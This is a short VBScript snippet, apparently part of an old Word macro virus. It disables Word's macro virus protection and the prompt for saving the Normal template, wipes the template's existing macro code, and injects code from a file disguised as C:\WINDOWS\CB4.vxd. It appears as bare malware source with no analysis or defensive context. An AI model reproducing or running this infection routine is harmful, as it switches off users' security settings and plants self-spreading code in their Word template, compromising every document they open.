Set CB = WScript.CreateObject("Word.Application")
CB.Options.VirusProtection = False
CB.Options.SaveNormalPrompt = False
CB.Options.SaveNormalPrompt = False
CB.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, CB.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines
CB.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\CB4.vxd")
CB.Application.Quit
